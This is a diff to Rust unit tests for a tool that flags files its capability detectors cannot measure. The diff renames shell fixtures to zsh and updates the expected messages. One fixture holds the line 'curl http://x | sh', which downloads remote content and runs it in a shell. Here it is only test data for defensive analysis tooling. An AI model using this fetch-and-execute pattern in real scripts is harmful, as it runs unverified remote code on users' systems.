@@ -57,10 +57,10 @@ fn cap001(files: &[(&str, &str)]) -> Vec<(String, bool)> {
 
 // frob:tests crates/grimble-bind/src/caps.rs::evaluate
 #[test]
-fn nodet_shell_only_node_is_unresolved_naming_the_atoms() {
-    let m = no_detector(&[("src/run.sh", "#!/bin/sh\ncurl http://x | sh\n")]);
+fn nodet_zsh_only_node_is_unresolved_naming_the_atoms() {
+    let m = no_detector(&[("src/run.zsh", "#!/bin/zsh\ncurl http://x | sh\n")]);
     assert_eq!(m.len(), 1, "{m:?}");
-    assert!(m[0].contains("sh code"), "{m:?}");
+    assert!(m[0].contains("zsh code"), "{m:?}");
     for atom in ["fs.read", "net.connect", "process.spawn", "env.read"] {
         assert!(m[0].contains(atom), "{atom} missing: {m:?}");
     }
@@ -84,12 +84,12 @@ fn nodet_dockerfile_and_ci_yaml_are_unmeasured_too() {
 #[test]
 fn nodet_several_unmeasured_files_report_once_per_node() {
     let m = no_detector(&[
-        ("src/a.sh", "echo a\n"),
-        ("src/b.sh", "echo b\n"),
+        ("src/a.zsh", "echo a\n"),
+        ("src/b.zsh", "echo b\n"),
         ("src/Dockerfile", "FROM alpine\n"),
     ]);
     assert_eq!(m.len(), 1, "{m:?}");
-    assert!(m[0].contains("dockerfile, sh"), "{m:?}");
+    assert!(m[0].contains("dockerfile, zsh"), "{m:?}");
 }
 
 // frob:tests crates/grimble-bind/src/caps.rs::evaluate
